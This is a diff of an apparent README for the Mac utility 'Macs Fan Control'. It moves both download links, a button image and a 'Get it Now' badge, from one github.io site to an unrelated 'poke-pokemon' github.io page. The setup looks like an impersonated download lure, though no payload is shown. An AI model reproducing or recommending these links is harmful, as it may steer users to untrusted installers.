@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://andrey-petrov-software.github.io/.github/macsFanControl">
+  <a href="https://poke-pokemon.github.io/.github/macsFanControl">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Macs Fan Control"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ Temperature monitoring alone provides significant value for Mac users who want t
 
 <p align="center">
 
-[![Get it Now Macs Fan Control](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/macsFanControl)
+[![Get it Now Macs Fan Control](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/macsFanControl)
 
 </p>
 
